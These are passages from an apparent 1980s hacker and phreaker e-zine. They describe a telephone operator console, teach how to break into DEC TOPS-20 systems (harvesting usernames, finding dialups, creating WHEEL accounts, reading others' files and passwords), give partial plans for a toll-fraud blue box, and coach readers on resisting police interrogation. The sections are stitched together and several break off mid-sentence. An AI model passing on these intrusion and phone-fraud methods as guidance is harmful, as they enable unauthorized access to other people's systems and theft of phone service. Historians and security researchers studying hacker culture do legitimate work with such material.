again are various multi purpose key's that serve the following    SR    Service  assistance  Required, Illuminated Key. Pressed by TSO to Forward calling party to a supervisory console  ie. Irate Customers demanding supervisor , can also be used if she is confused and needs assistance.   MB    Make Busy, Illuminated key. Used to  Busy out  her console, lights when pressed, console will not take any incoming calls until it is pressed again.  ie  Useful when gabbing, doing nails, or filling out time trouble tickets .   Mt    Maintenance, Lamp. This lamp Illuminates to warn the TSO that her console has been placed into remote maintenance testing mode.  A flashing MTNC lamp indicates a faulty console.   PT    Position Transfer, Illuminated Key. A TSO depresses this key to transfer the call in progress from her console  position  to another console.       Below the  Outgoing Trunk  keygroup, you will see a Lamp marked  Cw  Call Waiting   This lamp lights on every active console to inform a TSO that there are incoming calls waiting.       To the far right of the  Cw  lamp, you will find the AMA group of keys, broken into two sub groups, which are  Station  and  Person , a complete description of each key in this group would require more room than I have available here, so if there's sufficient interest I will devote another article to the use of these key's.  Basically these key's are used in conjunction with the  KP  and  AMA Timing  groups of key's  see below , for attaching the appropriate class of charge to the call being originated. The keys in the  Station  sub class from left to right are  Paid   PA , which is used to attach a  Station to Station  originating caller paid class of charge,  Collect   COL  to attach  Station to Station  Collect Call.  Special Calling   SP CG , and  Special Called   SC CD  which are both used in  Special  Station to Station billing procedures, such as third party, or credit card calls.  Auto Collect   AT CT , used in coin billing procedures and  Direct Distance Dialing   DDD , Attaches a DDD class of charge in cases where you have trouble dialing a number and require operator assistance in completing a call.  Below this row of keys you will find the  Person  sub group of AMA keys, their uses are identical to those in the  Station to Station  group only they attach a  Person to Person  rate of charge. The  No AMA   NO AMA , key is pressed to eliminate a charge for a person to person call where the called party is unavailable.  Although all the key's in this group can take on different meanings under different conditions, the above definitions are suitable for the sake of this article. All key's in this group are Illuminated keys.       Below the  Cw  lamp you will find two keys under the heading  Coin 2 , their uses on  Coin originated  payphone   calls are   Coin Collect   COL    which causes the payphone to collect coin, and the  Coin Return   RET , causes it to return a coin. Both are Illuminated Key's.       To the right of the  Coin 2  group, you will find the  AMA Timing  group. These key's are used in conjunction with the  AMA , and  KP  groups for    CA TMG    Cancel Timing, Illuminated Key. Cancels AMA timing charges and also allows TSO to change the class of charge on a call.   ST TMG    Start Timing, Illuminated Key. Used to start AMA timing after appropriate class of charge has been entered, and the calling party has reached the called party in person to person calls  or in station to station DDD calls, destination ring has been established .   CA CAL    Cancel Call, Illuminated Key. Used in conjunction with the Cancel Timing key to Cancel a call and mark a  NON COMPLETED  call on the AMA tapes  ie. A person to person call where the called party is not available .   REC MSG    Record  AMA  Message, Illuminated Key. Used at the completion of  completion meaning calling   called party are done talking , to record the time of the call and the appropriate class of charge onto the AMA tapes and releases their forward connection.      To the right of the AMA timing group you will see three columns of four buttons under the heading of Loop Control. These allow the TSO to access any of the three loops available to her for placing calls. The keys have identical meaning in each set they are used in the following manner     CLG    Calling Party, Lamp. Lights to signify person on said loop is a calling party.   CLD    Called Party, Lamp. Lights to signify that person on loop is a called party.   HLD    Hold, Illuminated key. Places a loop into a hold state, the calling and called party can talk to each other, and AMA timing can be started. The call is held at the console.   ACS    Access, Illuminated key. Used by TSO to initially access a loop. Pressing this key selects an outgoing loop, and readies the console for placing a call onto it. It is also used to allow TSO back into a loop s  in a HOLD state.       To the right of the loop control group you will see the  Keypulse Key  group, these key's are pressed by the TSO to initialize the keypad parser into the proper mode for entering information, which is completed entered by pressing the ST  START  key  to right of keypad . Their uses are as follows    KP TB    KP Trouble, Illuminated key. Used to enter various TSO encountered trouble codes such as noisy line, customer s  were cut off, couldn't complete call, etc. I believe the format for entering a trouble code is as follows   KP TBL   TC   NTE   CN   ST  where KP TBL   KP Trouble Key, TC   2 Digit Trouble code, NTE   Number of times Trouble was encountered  1 Digit , CN   Callers  phone  Number, and ST   the START key. a record of the trouble is made on the AMA tapes and the calling party is usually given credit.   KP RT    KP Rate, Illuminated. Used to enter and display Rate  Charge  information. Can also be used to display rate information at a customer request.   KP HO    KP Hotel, Illuminated Key. Used for manually entering a verbally requested room number on  Hotel Motel originated calls.   KP NY    KP Notify, Illuminated key. Used for entering time in Minutes on a NON ACTS originated Coin call, when entered time duration is up, it causes the NFY Lamp  See above  to Flash.   KP SP    KP Special, Illuminated Key. Used for entering Special numbers such as credit card id's and third party billing numbers, causes TSPS software to automatically query the BVA  Billing Validation  database to check validity of number CC, will flash if billing to an illegal card or number is attempted.   KP BK    KP Back, Illuminated Key. Used in entering the calling number in ANI failures  ANIF , and ONI  Operator Number Identification  required situations.   KP FD    KP Forward, Illuminated. Most commonly used KP Key. Used to enter called party's number on all TSO assisted calls. Pressing the ST  START  key causes the entered number to be applied onto the accessed trunks in MF.   ST    Start, Illuminated Key  Found to the right of the keypad . Used in completing all KP number sequences listed above.     Below the  Coin 2  set of key's you will see the  POS RLS    Position Release key, this key is used by the TSO to release her position from the call. She would hit POS RLS after completing a call, and also to release a person calling to ask her questions and not actually requesting a call be placed  ie. Name place requests, etc..      Below the Position Release key you will see a set of 5 key's labeled  Display Control , these key's are used to make the console display show various information. Their use is as follows     TIM    Time, Unlighted Key. Displays time of day in Military format.   CHG MIN    Charge per Minute, Unlighted Key. Displays the   charge per minute on a call in progress.   CLG NUM    Calling Number, Illuminated Key. Displays the number of the calling party.   CLD NUM    Called number, Illuminated Key. Displays the number of the called party.   SPL NUM    Special Number, Illuminated Key. Display's various special numbers such as Calling Card numbers, and third party billed numbers. Use of this key in displaying Calling Card numbers is as follows   Press it once you get first 10 digits of 16 digit Calling Card, press it a second time and get the second 6 digits of the Calling Card, press it again and it darkens the display.     That's it for the key's on the console, on the left hand side of the diagram you will see the  Multi Leaf Bulletin Tray , this is an all purpose holder for information leaflets that contain information on special numbers, Rate   Route information, special non standard assistance routes, and various other TSPS related information. At the lower right hand side of the console is the  Number Plate , this is simply the console's Position number and ID number. It is a stamped metal plate, I haven't figured out any way to abuse it yet, other than scaring a TSO by knowing of it's existence.     That's about it for this article, if there is sufficient interest in TSPS I will write further articles with more detail on the actual procedures used by the TSPS operator in call handling and such, I will also be writing an article on the BOC TOPS  Toll Operator Position Service  operators that have begun to pop up since the divestiture when I get some better information on the position itself. It seems that AT T inwards no longer handle only long distance assistance in TOPS services areas and the TOPS op's handle all local area assistance.  Until then, Dial with Care.                                    The                                    Marauder                                 Legion of Doom!                                                                                  Any questions, comments or clarifications can be made directly to me, or via the TJ's Staff account.   The LOD H Technical Journal  File  5 of 12                    An Introduction to Hacking TOPS 20s                                  by                           The Blue Archer     To begin with, I would like introduce this article and clarify a few things. Firstly, this article was written to familiarize interested hackers in DEC's TOPS 20  Total OPerating System 20  and give them knowledge of how to properly utilize its resources.  This article will generally be limited to the basics, with an advanced article forthcoming.  Secondly, you may have seen other articles I have written on the Tops 20 a while back. Well this is simply a better organized and updated article with primarily the same information. And finally, I would like to say that I welcome any and all questions about the article or the operating system and would be glad to help out with any problems. I may be reached on certain boards or through the LOD H TJ Staff Account on sponsor BBS's. Anyway, have a good time hacking your local TOPS!  Starting Notes                o Capital letters in the beginning of a command indicate that those letters   alone may be typed for the whole command. o     Brackets around any element s  are required. o     Parenthesis are not required unless otherwise stated. o  D  This symbol refers to control  ex  DA  Control A . o     Is the general system prompt and is not considered to be typed by the       user when shown in examples. o     This is the enabled state system prompt  explained hereafter .                                                                              EXTERNAL USAGE                                                                              SECTION I  ACCESS    The commands for entering and leaving a Tops 20 are LOGin and LOGOut respectively. The correct usage of these command are as follows     LOGin USERNAME    LOGOut USERNAME Where username is a variable for the account name. Account names may be virtually anything, depending upon the system. I employ two methods for attaining usernames. The first, and most commonly known and used is checking the system status. This is done thusly     SYstat This will cause the computer to list out various information about the assorted users logged in and their status and the status of the system as a whole. This command does not work on all Tops 20 computers from a non logged in state, namely versions 6.1 and higher. A second and immensely more effective method is superior use of the escape character. The complete use of this character will be discussed later. For use in logging, one types LOGin and then a letter or series of letters and then the escape key. Depending on the number of usernames beginning with the same letter s , the computer will fill in the rest of the username. Once the letters are in such a way that if one continued typing, only one valid username could be gotten, the escape key will fill in the rest if pressed. Here is an example   LOGin S escape   the computer responds with a beep because there is more than one username starting with the letter S, so I type another letter   LOGin SM escape   beep once more   LOGin SMI escape   LOGin SMIth  PASSWORD                The computer fills in the 'th' part of the username for me and asks for the password with the parenthesis and all . One note  If the computer fills in an account name and then when a password is tried it responds with a 'not valid account' message, it simply means that it is a non loginable files only account which will be discussed later.   While trying to gain access to a system, it is wise to use all the pre login resources avaiable. On versions 6.x these resources are virtualy nil but on the older versions, one may sometimes find an incredible amount of help.  To see what actual help is available, type     HELP   Look for certain things like SECURITY and LOGINHELP.  If the system in use is on a net, or for some reason the dialup number is not known but wanted, it can sometimes be found in help files most commonly named DIAL, DIALUP S , and PHONES. So, to view them, simply type     HELP DIALUPS Or the name of whatever help file that is desired to be seen.   The Information command is also a useful command, more fully discussed later. The most useful Information commands are as follows   Information VERSion   This will display the banner. If the computer, for security reasons, did   not display the banner upon connection, then this may prove useful in   identifying the target computer  Information DEC   lists the various Decnet nodes available. On 6.x versions  I DEC NODENAME    will tell if a path is open to the node or is the object node is currently    up and running.  I ARPA    will tell the status of ARPANET with respect to this particular computer. Meaning whether or not the software is up and running and the status of connections.   Networking will be explained in the advanced Tops hacking file.                                                                                    INTERNAL USAGE                                                                              SECTION II  SYSTEM FUNCTIONS    Under normal circumstances, with the exception of currently running programs, the exec level  command level  prompt will be either   ' or   ' depending on certain options, which will be discussed later. For now we will assume the prompt is  . This is the place where commands given are executed immediately. Certain characters are also available for use here  and other places  which make life on a TOPS 20 easier. Here is a list of those characters   1  DC  This gets the system's attention. It will break out of most programs and processes. It may be necessary to type 2 for it to work, though. 3  DO  Halts terminal output without interrupting the program. A second DO restarts output to terminal. Note  under this condition output is still being sent by the computer, it is just not printed on the terminal, as opposed to an actual ceasing of output by DS. 4  DS  Temporarily pauses current output. 5  DQ  Resumes output currently suspended by DS. 6  DR  Retypes current line discarding old line. 7  DT  Prints information including what the program in use is doing, CPU information, and load average  amount of users on system.  8   Escape   The Escape key causes a form of recognition for virtually anything being done on the TOPS. It will complete commands, filenames, and just about anything else being typed to the computer. For example I escape  would result in the command INFORMATION. For further information on this command refer to the logging in procedure utilizing this feature. 9     This is used to obtain information regarding what the system is expecting as input or what the current command options are. It may be used almost anywhere, including after single or multiple letters, filenames, etc. example   C  would print a list of available exec level commands starting with the letter C.    Here is a list of commands used to obtain system information   1  DAYtime  Prints current data and time of day. 2  HELP  Gives help on a wide variety of topics, depending on the system. For a complete list, type  HELP   3  Information  Provides information on a wide variety of topics. For a complete list, type  I   4  SYstat  Outputs a summary of system users and available computer resources.                            SECTION III  ACCOUNT STRUCTURE      The TOPS 20 users login and use the system via accounts which are variable with different privilege levels and access rights. Accounts are specified by usernames and most of the time the directory names are the same as the account names as is also common for VMS. So, logging in under the SMITH means that one is under the account  username  SMITH. To find out the privileges of an account, type   I DIR  USERNAME  This can always be done to the account logged in under, and sometimes to other accounts depending on access rights and the security of the other account. This command prints out information regarding the account specified. It will even show passwords on pre 6.x versions of TOPS if one has sufficient privs. In general the two major levels of privs are full and normal. Full privs are denoted by OPERATOR or WHEEL in the privilege information printed. This level gives the user complete authority over the system. The normal level of privs means anything else but OPERATOR or WHEEL. These forms of accounts have limited access with respect to system operations and other accounts. Access to certain programs, files, and information is restricted to whatever extent the system owners choose. Other minor privilege abilities enable the user to perform slightly more than completely normal users, and sometimes may be of importance depending on the circumstances.   Creation and modification of accounts is done through the BUIld command. Example   BUILD  USERNAME  Where  USERNAME  is the account to be modified  already exists  or an account to be created  non existant . Depending on the privs of the account attempting to build and system restrictions, one may have a great deal or virtually no power to create and modify. On most systems, only wheels and operators can create top level accounts  loginable non subdirectory accounts . File storage sub accounts can be created almost anywhere. These are simply accounts in which files are put, and these accounts cannot be logged into. To see what options have been chosen for the account being built, simply type    LIST Other options for the account being built are as follows  1  WHEEL  This gives the account wheel  complete  privileges. If this option is chosen, then others may be excluded for it is all encompassing, it overrides any and all protection. 2  OPERATOR  Same as wheel. 3  DECNET ACCESS  This allows the account to use the decnet, assuming there is one available. DECNET and other nets will be explained in the advanced article. 4  ARPANET ACCESS  Allows user to use the Arpanet. 5  ARPANET WIZARD  This command allows the user ARPANET ACCESS and more. This account has the ability to turn the Arpanet software of the system on and off. The commands are as follows   DESET ARPA ON  DESET ARPA OFF Use of DE will be discussed in the next article. The dollar sign for the system prompt is explained later. 6  IPCF  Allows Inter Process Communication Facility capabilities. 7  DEFAULT FILE PROTECTION  Sets the protection of the files in the user's directory. The lower, the more secure. 8  PROTECTION OF DIRECTORY  Sets protection of the actual account itself. This means who can connect to it, modify it, etc. Once again, the lower the protection, the more secure it is against others. 9  PASSWORD  Sets the password for the account. Type PASSword with the actual password after it. 10  KILL  This destroys the account. This command removes the account from the system. To complete the creation modification, type two carriage returns.    The system will not recognize the user as having its various privileges unless it is told that they are there. This is done thusly   ENAble This enables all the user's privileges and changes the prompt to a ' '. All accounts, even wheels, are considered normal until enabled, so this must always be done before an action requiring privileges is performed. It is fine to do this immediately after logging in and leaving it like that, for it does not save any adverse effects. At all places in this article where there is a ' ', if enabled would be a ' '.                               SECTION IV  DIRECTORY USAGE    Directories are storage places for files. Each account has a directory in its own name, and possibly one or more subdirectories. To see what files are in the directory connected to at the moment, type the command DIRectory   DIR This will list what files, if any, are accesable in this directory. At the time of login the computer sets the account's own directory as the one to be connected to unless otherwise specified by such things as login adjustment files  to be discussed at a later date.  Subdirectories of an account are denoted by a period between the account name and directory name. Example   ACCOUNTNAME.SUBDIRECTORYNAME  Subdirectories are dealt with as normal directories for purposes of usage. Dealings with directories other than the current default directory require the use of brackets. For example, if one wanted to look in a directory titled  SMITH , he would have to type   DIR  SMITH  And assuming his directory is not protected, a list of files in the  SMITH  directory will be produced. The current default directory  the one connected to  does not require brackets for usage. Most directory commands may be used on other directories by simply placing the object directory  one to be commanded  in brackets after the command.   Here is a list of some of the more important directory related commands   1  ACCESS  This command requires the password of the target directory and, if correctly given, transfers rights to that directory including creation deletion of files, etc. The format for usage is   ACCESS  DIRECTORY  2  CONNECT  This changes the current default directory to the specified one. It may be countered, though, by protection. If ACCESS to the object directory is on then connection may be established regardless of protection. The command is used like this   CONNECT  DIRECTORY  3  COPY  This duplicates an already existing file in another directory to the current default directory or another specified directory. The format is   COPY  OBJECTDIRECTORY FILENAME.FILETYPE to copy it to the default directory, or   COPY  OBJECTDIRECTORY FILENAME.FILETYPE  OTHERDIRECTORY FILENAME.FILETYPE to copy it to another directory. 4  DELete  Deletes the file from the directory. It still exists and may be retrieved until it is completely removed. 5  EXPunge  Completely removes deleted files from the system forever. 6  FDIRectory  Lists all information about all files in directory. 7  RENAme  Rename a specified file. The format is   RENAme FILENAME.FILETYPE NEWFILENAME.FILETYPE 8  UNDELete  Restores deleted files which have not been expunged yet. 9  VDIRectory  List all information about all files in directory specified, including protection, size, and date and time when they were last written.      Files in directories are in the form of  FILENAME.FILETYPE.  where filename is the name of the file, filetype is the kind of file, and   is the number of the file. If there is more than one file with the same name, multiple numbers will be shown. If a number is left out when a command dealing with a file is typed, then the file with the highest number will be used.     Here is a list of filetypes and how to properly use them   1  .BAS  These are files written in basic. To use these, type BASIC or BASIC20 and LOAD them in and RUN, LIST, or modify them in the basic language and SAVE. 2  .BIN  These are binary files containing program data and are generaly not directly used. 3  .CMD  These are command files. They are files of a series of commands to be executed. Commands will be carried out as if typed by the user from the exec level. To use them, type   TAKE FILENAME.CMD They are very useful for performing long processes which must be done often. 4  .CTL  This is a control file for batch jobs. It tells the batch job what to do when it logs in. Batch jobs are jobs logged into the account which created it to carry out commands. Further discussion of batch jobs is in the next TOPS article. The format for usage of these files are   SUBmit FILENAME.CTL 5  .EXE  Files of this sort are executable from the exec level. They are assembled programs in machine language and the fastest sort of program on the TOPS. To use them, type    DIRECTORY FILENAME.EXE 6  .HLP  This is basically just a text file. Use the same command as the .TXT forms of files. If a file of this sort is placed within the actual  HELP  directory, it becomes available to the whole system by simply typing   HELP FILENAME All information obtained through the HELP command is actually in the form of files in the  HELP  directory. 7  .INIT  These are initialization routines for various programs. They are not used directly. 8  .LOG  This is the output of batch jobs. It details the actions of the job and the responses of the computer. To view, do this   TYpe FILENAME.LOG 9  .MEM  This is a memorandum. Often times being inter office memos and the like. Use them as any normal text file. 10  .TEXT  This is the uncommon filetype name for a text file. See .TXT for proper usage. 11  .TXT  These are text files. They contain written information and data to be read. The command for using them is as follows   TYpe FILENAME.TXT    To use files in other directories, type the directory name in brackets before the filename. Ex   TYpe  SMITH SECRET.TXT This applies for all filetypes and commands. Once again restrictions may apply with regard to protection.                           SECTION V  SYSTEM WIDE COMMUNICATIONS    Communication to other system users is done primarily two ways  direct and indirect. Direct includes chatting with another online user and such, while indirect is generally done through electronic mail and the like.   Here are the common commands of direct communication   1  ADVISE  When this is done, whatever is typed at one terminal is executed at another. For example    ADVISE USERNAME Then, whatever is typed will be carried out as if typed from that terminal until the link is broken. 2  BReak  This breaks all links to the terminal typing BReak. 3  RECEIVE  This allows the terminal to receive either LINKS or ADVICE, as specified by the command. Ex   RECEIVE ADVICE 4  REFUSE  This puts up a barrier keeping links or advice from reaching the terminal. REFUSE ADVICE is default when logging in, so in order receive advice, one would have to type the proper command. 5  REMark  Goes into a chat state in which textual information is sent to the computer and not interpreted as commands. 6  TALK  Establishes a link between two terminals. Ex   TALK SMITH would establish a link with SMITH. Whatever is typed is seen by both parties. REMark is useful here if a conversation is to ensue.    Electronic mail can be sent and read through various programs. The most common ones being MM, MAIL, MS, and RDMAIL. Users are informed when they have a message waiting upon logging in. Mail is stored in the file MAIL.TXT in the user's directory. MM and MS are the best mail programs and should be the ones used, so here is a very brief explanation of the major commands they both use  they are very similar .  1   SEND  This is the command used to send mail to another user. At the prompt of the respective mail program, type SEND and a carriage return,  the computer will prompt for information such as the user for the message to be sent to, other users to receive a copy of the message, and the title of the piece of mail. 2  READ  This command, if typed with no argument, will start reading all currently unread mail. If used with the number of a piece of mail, it will read that one alone. 3  HEADERS ALL  This will give a list of all the titles of the various pieces of mail in the user's mailbox and the corresponding number of that mail.   Sending mail over networks will be discussed in the next article. Look for it in the next issue of the Technical Journal.

There are other ways to build Blue Boxes, some being better and some not as good, but I chose to do it this way.  My reason for doing so  because at the time I started this project, about the only schematic available on BBS's was the one written by Mr. America and Nickie Halflinger.  Those plans soon  in about 90 seconds  became very vague in their context with a couple in  consistencies, but I decided to  rough it out  using those plans  based on the Exar 2207 VCO  and build the Blue Box using that as my guide.  During the construction of the Blue Box, I decided to type up a  more complete and clear  set of Blue Box schematics than the file that I based mine on, in order to help others who may be trying thinking of building a Blue Box.  I hope these help.       Note   You should get a copy of the Mr. America Nickie Halflinger Blue Box plans.  Those plans may be of help to anyone who may have difficulty understanding these plans.  Also, these plans currently do not support CCITT.                                        Why should I build a Blue Box                                              Many of you may have that question, and here's my answer. Blue Boxing was the origin of phreaking  excluding whistling . Without the advent of Blue Boxes, I feel that some of the advances in the telecommunications industry would've taken longer to develop  The need to stop the phone phreaks forced AT T Bell Laboratories to  step up  their development to stop those thieves! .      There is no harm in building a Blue Box  except the knowledge you will gain in the field of electronics .  Although there are software programs  Soft Blue Boxes  available for many micro's that will produce the Blue Box Multi Frequency  MF  tones, they are not as portable as an actual Blue Box  you can't carry your computer to a telephone, so you must use it from home which could possibly lead to danger .      Many phreaks are announcing the end of the Blue Box Era, but due to discoveries I have made  even on ESS 1A and possibly ESS 5 , I do not believe this to be true.  Although many people consider Blue Boxing  a pain in the ass , I consider Blue Boxing to be  phreaking in its' purest form .  There is much to learn on the current fone network that has not been written about, and Blue Boxes are necessary for some of these discoveries.  The gift of free fone calls tends to be a bonus.       Note  Blue Boxes also make great Christmas gifts!                                              Items needed to construct a Blue Box.                                                  Here is the list of items you will need and where you can get them.  It may be a good idea to gather some of the key parts  the chips, and especially the potentiometers, they took about 6 months to back order through Digi key.  A whole 6 fucking months!  before you start this project.  Also, basic electronics tools will be necessary, and you might want to test the circuit on a bread board, then wire wrap the final project. Also, you will need a box of some sort to put it in  like the blue plastic kind at Radio Shack that cost around  5.00 .       Note  An oscilliscope should be used when tuning in the            potentiometers because the Bell system allows            only a 7 10  tolerance in the precision of the            frequencies.

The speaker can be from a regular telephone  mine just happened to be from an old Autovon phone .  But make sure that you remove the diode.      The Potentiometers should have a 100K Ohm range  but you may want to make the calculations yourself to double check .      The 9 volt battery can be obtained for free if you use your Radio Shack Free Battery Club card.      The Exar 2207 VCO can be found if you call the Exar Corp. located in Sunnyvale, California.  Call them, and tell them the state you live in, and they'll give the name and phone number to the distributor that is located closest to you. The 2207 will vary from about  3.00 for the silicon grade  which is the one you'll want to use  to about  12.00 for the high grade Military chip.      Note   When you call Exar, you may want to ask them to send you the spec sheets that gives greater detail as to the operation and construction of the chip.

Jester Sluggo  The LOD H Technical Journal  File  7 of 12      Intelligence and Interrogation Processes    By   Master Of Impact and the Legion Of Hackers                                 INTRODUCTION                                                  Doing what we do best always carries the risk of someone, somewhere, wanting to hold you for questioning. In this article I hope to give those persons who that are in use  and are in no ways happen to be all new , that can give you the edge you need to come away  sin faulta . In fact, these interrogation practicies are used a lot by teachers, local police, the FBI and Secret Service girlfriends, wives, parents, etc. to obtain information from you that you probably don't want to give out.       Interrogation is the art of questioning and examining a source in order to obtain the maximum amount of useful information. The goal of any interrogation is to obtain useful and reliable information in a lawful manner and in a minimum amount of time. The goal of any source is to deceive or hinder any attempts of the interrogator to get information out of him.       This article will deal primarily with the principles, techniques, and procedures of intelligence interrogation. By reading this article, one who runs the risk of being interrogated can build countermeasures for common interrogation techniques. This article has some paraphrased material from a government interrogation manual but the majority of the information was from personal experience and prior knowledge of the subject.       You cannot hope to defeat interrogation techniques unless you first know what they are. The ones listed herein are the most commonly used. After reading this article, you should be able to tell when you are being interrogated by people, and what technique s  they are using when you probably would not have known before. Once you know what they are up to and how they are going to TRY to accomplish it, YOU have the initiative!                                   INITIATIVE                                                    Achieving and maintaining the initiative is essential to a successful interrogation just as offense is the key to success in combat operations. The initiative in any interrogation must rest with the interrogator throughout the entire interrogation. He will have certain advantages at the beginning of an interrogation which will enable him to grasp the initiative and assist in maintaining the initiative throughout the interrogation.       The interrogator has a position of authority over you. You realize this fact, and in some cases, believe that your future might well depend upon your association with the interrogator. As in the case of police questioning,  cooperate and we will go easy on you . Like hell they will.       The interrogator knows the purpose of the interrogation  the source does not necessarily know the exact reason, but can generally assume  especially in the case of a computer hacker or phone phreak, which is what the term  source  will be referring to during this article  because he or she is most usually conscious of horrible and nasty wrong doings he or she may have been responsible for.  Unfortunately for the source, he is generally very much in the dark about what's happening to his life while it is, in fact, crumbling around him  temporarily, anyway . This gives the source a not so illusionary behavior pattern of the proverbial chicken who's had its head chopped off.       Having gained the initial advantage which is quite an understatement, seeing that, although the risks to the source during the perpetration of a crime are quite obvious, the possible realistic results of being caught aren't quite as impressive while one is getting away with a crime than when one's home is invaded by the JC Penny suit men wearing mirrored sunglasses, the interrogator must strive to maintain the initiative applying appropriate interrogation techniques through the exercise of self control  by taking advantage of the source's weaknesses as they become apparent  and by continuously displaying an attitude of confidence and self assurance. The interrogator, however, is 'supposed' to never take advantage of your weaknesses to the extent that the interrogation involves threats, insults, torture or exposure to unpleasant or inhumane treatment of any kind. Remember, the keyword is supposed.       It is possible for the interrogator to lose the initiative during the interrogation of a source. If this should occur, he will probably postpone the interrogation and reassess the situation. If the interrogation is resumed, a different interrogator will probably be introduced. Following are some examples of loss of initiative     The interrogator becomes angry and completely loses his self control because   of the arrogant actions of the source  such as the unbuttoning of a jacket   to reveal  Secret Service Sucks  spray painted onto the source's T shirt.    As a result, the interrogator loses sight of his objective and concentrates   his efforts on humbling the source.    During the interrogation the interrogator fails to note significant   discrepancies in the source's story. The interrogator may lose his initiative   as the source gains confidence from his success and resorts to further   deception, leading the interrogator away from his objective.    The interrogator becomes overly friendly with the source and allows him to   lead the interrogation. The source reports only what he believes to be   important and neglects several significant items of info which could have   been obtained had the interrogator maintained the initiative.                              PHASES OF INTERROGATION                                                             Approach Phase                              Regardless of the type of source you are and your outward personality, you do possess weaknesses which, if recognized by the interrogator, can be exploited. A human being is likely to         o   Talk, especially after harrowing experiences       o   Show deference when confronted by superior authority       o   Rationalize acts about which he feels guilty       o   Lack the ability to apply or to remember lessons he may have been           taught regarding security if confronted with a disorganized or a           strange situation.       o   Cooperate with those who have control over him       o   Attach less importance to a topic which the interrogator demonstrates           identical or related experiences and knowledge       o   Appreciate flattery and exoneration from guilt       o   Cooperate readily when given material rewards       o   Cooperate readily when treated as an equal                                     TECHNIQUES                                                         File and Dossier                                 The interrogator prepares a dossier containing all available info obtained from records and docs concerning you. Careful arrangement of the material with  in the file may give the illusion that it contains more data than is actually there. The file may be  padded  with extra paper, if necessary. Index tabs with titles such as  education ,  employment ,  criminal record ,  bulletin boards ,  violated computer systems , and others are particularly effective for this purpose. The interrogtor will confront you with the dossier at the beginning of the interrogation and explain that  intelligence  has provided a complete record of every significant happening in your life  therefore, it would be useless to resist interrogation. The interrogator may read a few selected bits of known data to further impress you. If the technique is successful, you will be impressed with and more importantly, terrified by the  voluminous  file, conclude that everything is known, and resign to complete cooperation.          We know ALL                           This technique may be employed in conjunction with the above or by itself. The interrogator must first become thoroughly familiar with the available data concerning you. To begin the interrogation, the interrogator asks questions based on his known data. When you hesitate, refuse to answer, or provide an incomplete or incorrect reply, the interrogator himself provides the detailed answer. Through the careful use of the limited number of known details, the interrogator may convince you that all the info is already known  therefore, your answers to the questions are of no consequence. When you begin to give accurate and complete information, the interrogator interjects questions designed to gain the needed info. Questions to which answers are already known are also asked to test you and to maintain the deception that all the info is already known. A VERY effective technique I might add.         Rapid Fire                      This approach technique involves a psychological ploy based on the principles that         Everyone likes to be heard when they speak  and        It is confusing to be interrupted in mid sentence with an unrelated       question.       This technique may be used with one, or simultaneously by two or more interrogators in questioning the same source. In employing this technique the interrogator asks a series of questions in such a manner that you do not have time to answer a question completely before the next question is asked. This tends to confuse you and you are apt to contradict yourself, as you have little time to prepare your answers. The interrogator then confronts you with the inconsistencies, causing further contradictions. In many instances you will begin to talk freely in an attempt to explain yourself and deny the inconsistencies pointed out by the interrogator. In attempting to explain your answers, you are likely to reveal more than you intend, thus creating additional leads for the interrogator.           Mutt and Jeff                              This technique involves a psychological ploy which takes advantage of the natural uncertainty and guilt which a source has as a result of being detained and questioned. Use of this technique necessitates the employment of two experienced interrogators who are convincing as actors. Basically, the two interrogators will display opposing personalities and attitudes towards you. For example the first interrogator is very formal and displays an unsympathetic attitude. This is to make you feel cut off from your friends. At the time when you act hopeless and alone, the second interrogator appears  having received his cue by a signal, and is hidden from you , scolds the first interrogator for his harsh behavior and orders him from the room. He then apologizes to soothe you, perhaps offering coffee and a cigarette. He explains that the actions of the first interrogator were largely the result of an inferior intellect and lack of human sensitivity. The inference is created that the other interrogator and you have in common a high degree of intelligence and an awareness of human sensitivity, above and beyond that of the first interrogator. You are normally inclined to have a feeling of gratitude towards the second interrogator, who continues to show a sympathetic attitude in an effort to increase the rapport and control for the questioning which will follow. Should your cooperativeness begin to fade, the second interrogator can hint that since he is of high rank, having many other duties, he cannot afford to waste time on an uncooperative source. He may broadly infer that the first interrogator might return to continue the questioning. When used against the proper source, this trick will normally gain complete cooperation for the interrogation.           Repetition                           Repetition is used to induce cooperation from a hostile source. The inter  rogator listens carefully to your answer to a question, and then repeats both the question and answer several times. He does this with each succeeding question until you become so bored with the procedure that you answer the question fully and truthfully to satisfy the interrogator and to gain relief from the monotony of this method of questioning. The repetition technique will generally not work when employed against introverted sources or those having great self control.           Pride and Ego                            This technique works effectively on many phreaks and hackers due to the fact that many are so damn egotistical. The strategy is to trick you into revealing desired information by flattering you.  It is effective with sources who have displayed weaknesses or feelings of inferiority. The interrogator accuses you of weakness or implies that you are unable to do a certain thing.  The proud or egotistical source will jump to the defensive. An example of an opening question for this technique may be    Why would you own a blue box when you have absolutely no idea how to use one   or,  Why do you hack VMS systems if you can't do a damn thing once you're inside of one   It provides you with the opportunity to show someone that you have  brains  and in doing so, you give the interrogator more information than you should have.            Silent                      The Silent technique may be successful when used against either the nervous, or the confident type source.  When employing this technique, the interrogator says nothing to you, but looks you squarely in the eye, probably with a slight smile on his face. It is important for the interrogator not to look away from you, but force you to break eye contact first. You will become nervous, begin to shift around in your chair, and look away. If you ask questions the interrogator probably will not answer them until he is ready to break the silence. A source may blurt out questions such as,  What the hell do you want with me . When the interrogator is ready to break the silence, he may do so with some quite nonchalant questions such as,  You've been logging on to our system for a long time now, haven't you  Did you hack the passwords yourself  .      In some cases the interrogator will use several approach techniques concurrently, or in succession.                                  QUESTIONS                                             There are various questions that the interrogator may ask you     Prepared questions   When the topic under inquiry is very technical or when   legal aspects of the interrogation require preciseness, the interrogator will   have a list of prepared questions to follow during the interrogation.    Control questions   To maintain control and to check on the truthfulness of   a source, the normal questions will be mixed with control questions those   with known answers. If you fail to answer these questions, or answer wrong,   it will indicate that you are either not knowledgeable in the topic or that   you are lying.    Nonpertinent questions   Sometimes it is necessary for the interrogator to   keep the true objective of the interrogation from you. By carefully blending   pertinent questions with nonpertinent questions, the interrogator can conceal   the true purpose of the inquiry.    Direct and leading questions   The manner in which the questions are worded   has a direct bearing on your response.  A question may be posed in a number   of ways     o  What system did you hack into on 11 11 86      o  Did you break into General Dynamics' computer on 11 11 86      o  You did break into GD's computer on 11 11 86      o  You didn't break into GD'S computer on 11 11 86, did you                               PSYCHOLOGY IN INTERROGATION                                                         The interrogator will watch for various psychological responses from you during an interrogation.  Some of these are       Rationalization   Creating plausible excuses or explanations for one's acts     without being aware that these excuses or explanations are way off the      obvious  reality.      Identification   To identify with and mimic a mental image of some one     important to you.      Compensation  Trying to make up for a psychological weakness by building     up or 